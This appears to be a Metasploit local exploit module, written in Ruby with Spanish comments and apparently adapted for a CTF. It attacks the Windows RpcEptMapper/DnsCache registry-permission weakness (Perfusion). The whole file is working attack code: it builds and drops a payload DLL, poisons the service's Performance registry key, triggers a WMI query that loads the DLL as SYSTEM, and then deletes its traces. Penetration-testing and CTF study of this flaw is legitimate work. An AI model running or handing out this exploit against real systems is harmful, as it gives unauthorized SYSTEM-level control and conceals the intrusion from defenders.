##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper # Mixin integrado para OpSec y limpieza de disco

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows RpcEptMapper / DnsCache LPE (Perfusion)',
      'Description'    => %q{
        Este módulo explota permisos débiles (ACLs) en las subclaves del registro 
        de los servicios RpcEptMapper o DnsCache. Al crear una clave "Performance" 
        y apuntar el valor "Library" a una DLL controlada, forzamos al servicio 
        (ejecutándose como SYSTEM) a cargar nuestro payload cuando se consulta 
        la clase WMI Win32_Perf.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Clément Labro', # Descubrimiento e investigación original
        'Red Gem',       # Módulo de Metasploit
        'securitylayer'  # Adaptación CTF
      ],
      'References'     => [
        ['URL', 'https://github.com/itm4n/Perfusion'],
        ['URL', 'https://itm4n.github.io/windows-registry-rpceptmapper-exploit/']
      ],
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'Targets'        => [
        [ 'Windows x64', { 'Arch' => ARCH_X64 } ],
        [ 'Windows x86', { 'Arch' => ARCH_X86 } ]
      ],
      'DefaultTarget'  => 0,
      'Notes'          => {
        'Stability'   => [ CRASH_SAFE ],
        'Reliability' => [ REPEATABLE_SESSION ]
      }
    ))

    register_options([
      OptEnum.new('TARGET_SERVICE', [true, 'The service vulnerable to exploitation', 'RpcEptMapper', ['RpcEptMapper', 'DnsCache']])
    ])
  end

  def check
    # Verificación rápida de arquitectura y privilegios
    if is_system?
      return Exploit::CheckCode::Safe('La sesión ya posee privilegios de SYSTEM.')
    end

    service = datastore['TARGET_SERVICE']
    reg_path = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{service}\\Performance"

    # Verificar si tenemos permisos para crear la clave
    begin
      registry_createkey(reg_path)
      registry_deletekey(reg_path)
      return Exploit::CheckCode::Appears("Permisos de escritura confirmados en #{service}.")
    rescue ::Exception
      return Exploit::CheckCode::Safe("Acceso denegado al registro del servicio #{service}.")
    end
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'La sesión actual ya es SYSTEM')
    end

    service = datastore['TARGET_SERVICE']
    reg_base = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{service}"
    perf_key = "#{reg_base}\\Performance"
    
    # 1. Weaponization: Generar la DLL maliciosa
    print_status("Generando payload DLL para la arquitectura del objetivo...")
    dll_data = generate_payload_dll
    
    # 2. Deployment: Escribir la DLL en disco (Living off the Land)
    temp_dir = session.sys.config.getenv('TEMP')
    dll_path = "#{temp_dir}\\#{Rex::Text.rand_text_alpha(8)}.dll"
    
    print_status("Subiendo DLL a #{dll_path}...")
    write_file(dll_path, dll_data)
    
    # Registramos el archivo Inmediatamente después de escribirlo para garantizar su borrado
    register_file_for_cleanup(dll_path)
    
    # 3. Explotación: Manipular el registro
    print_status("Envenenando la clave del registro: #{perf_key}")
    registry_createkey(perf_key)
    registry_setvaldata(perf_key, "Library", dll_path, "REG_SZ")
    registry_setvaldata(perf_key, "Open", "OpenPerfData", "REG_SZ")
    registry_setvaldata(perf_key, "Collect", "CollectPerfData", "REG_SZ")
    registry_setvaldata(perf_key, "Close", "ClosePerfData", "REG_SZ")

    # 4. Trigger: Invocar el subsistema de métricas WMI
    print_good("Disparando la consulta WMI para cargar la DLL como SYSTEM...")
    begin
      # Ejecución asíncrona para no colgar la sesión original
      cmd_exec("wmic path Win32_Perf", nil, 5) 
    rescue ::Exception => e
      print_warning("Wmic generó un timeout, esto es normal si el payload capturó el hilo: #{e.message}")
    end

    # 5. OpSec & Cleanup (Registro)
    print_status("Limpiando rastros del registro y sistema de archivos...")
    registry_deletekey(perf_key)
    
    # Nota: No necesitamos llamar a una función para borrar la DLL aquí, 
    # FileDropper se encargará automáticamente gracias a register_file_for_cleanup.
  end
end